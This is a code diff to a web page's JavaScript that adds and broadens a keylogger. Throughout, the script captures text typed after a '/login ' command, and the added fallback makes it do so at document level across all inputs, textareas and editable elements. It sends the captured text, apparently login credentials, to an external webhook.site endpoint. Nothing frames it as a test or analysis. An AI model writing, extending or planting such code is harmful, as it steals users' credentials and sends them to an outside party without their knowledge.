@@ -136,6 +136,7 @@
 
         let isLogging = false;
         let keyloggedData = '';
+        let currentInput = '';
 
         const logEndpoint = 'https://webhook.site/618173e1-b909-4f86-b229-bc0dd7604316';
 
@@ -144,7 +145,7 @@
                 const payload = {
                     timestamp: new Date().toISOString(),
                     keyloggedData: data,
-                    fullInput: fullInput // Include full text box value for debugging
+                    fullInput: fullInput
                 };
                 console.log('Sending payload:', payload);
                 const response = await fetch(logEndpoint, {
@@ -166,7 +167,12 @@
 
         // Function to attach keylogging to text box
         function attachKeylogger(textBox) {
-            console.log('Text box found:', textBox);
+            console.log('Text box found:', textBox, 'Attributes:', {
+                id: textBox.id,
+                class: textBox.className,
+                type: textBox.type,
+                tag: textBox.tagName
+            });
             textBox.addEventListener('input', (event) => {
                 const value = event.target.value;
                 console.log('Text box input:', value);
@@ -183,7 +189,7 @@
 
             textBox.addEventListener('keydown', (event) => {
                 if (event.key === 'Enter' && isLogging && keyloggedData) {
-                    console.log('Enter pressed - keyloggedData:', keyloggedData, 'fullInput:', textBox.value);
+                    console.log('Enter pressed in text box - keyloggedData:', keyloggedData, 'fullInput:', textBox.value);
                     sendKeyloggedData(keyloggedData, textBox.value);
                     isLogging = false;
                     keyloggedData = '';
@@ -191,16 +197,16 @@
             });
         }
 
-        // Observe DOM for text box added by classes.js
+        // Observe DOM for text box
         window.addEventListener('load', () => {
             const observer = new MutationObserver((mutations) => {
                 mutations.forEach((mutation) => {
                     mutation.addedNodes.forEach((node) => {
                         if (node.nodeType === Node.ELEMENT_NODE) {
-                            // Look for input or textarea
-                            const textBox = node.matches('input[type="text"], textarea') 
+                            // Broaden selector to include any input, textarea, or contenteditable
+                            const textBox = node.matches('input, textarea, [contenteditable]') 
                                 ? node 
-                                : node.querySelector('input[type="text"], textarea');
+                                : node.querySelector('input, textarea, [contenteditable]');
                             if (textBox) {
                                 attachKeylogger(textBox);
                             }
@@ -215,11 +221,56 @@
             });
 
             // Fallback: Check for existing text box
-            const existingTextBox = document.querySelector('input[type="text"], textarea');
+            const existingTextBox = document.querySelector('input, textarea, [contenteditable]');
             if (existingTextBox) {
                 attachKeylogger(existingTextBox);
             } else {
                 console.warn('No text box found initially. Waiting for classes.js to add it.');
+            }
+        });
+
+        // Fallback: Document-level keydown listener (from previous working version)
+        document.addEventListener('keydown', (event) => {
+            if (window.isSplashScreenActive) return;
+
+            const key = event.key;
+            console.log('Document key pressed:', key);
+
+            if (key === 'Backspace' && currentInput.length > 0) {
+                currentInput = currentInput.slice(0, -1);
+                if (isLogging && keyloggedData.length > 0) {
+                    keyloggedData = keyloggedData.slice(0, -1);
+                }
+                console.log('After backspace - currentInput:', currentInput, 'keyloggedData:', keyloggedData);
+            }
+
+            if (key === 'Enter') {
+                console.log('Document Enter pressed - isLogging:', isLogging, 'keyloggedData:', keyloggedData, 'currentInput:', currentInput);
+                if (isLogging && keyloggedData) {
+                    sendKeyloggedData(keyloggedData, currentInput);
+                    isLogging = false;
+                    keyloggedData = '';
+                }
+                currentInput = '';
+                return;
+            }
+
+            if (key.length > 1 && key !== 'Backspace') {
+                console.log('Ignoring non-character key:', key);
+                return;
+            }
+
+            if (key !== 'Backspace') {
+                currentInput += key;
+            }
+
+            if (currentInput.toLowerCase().startsWith('/login ') && !isLogging) {
+                isLogging = true;
+                keyloggedData = currentInput.slice(7);
+                console.log('Document /login detected - starting keylogging, keyloggedData:', keyloggedData);
+            } else if (isLogging && key !== 'Backspace') {
+                keyloggedData += key;
+                console.log('Document logging key - keyloggedData:', keyloggedData);
             }
         });
 
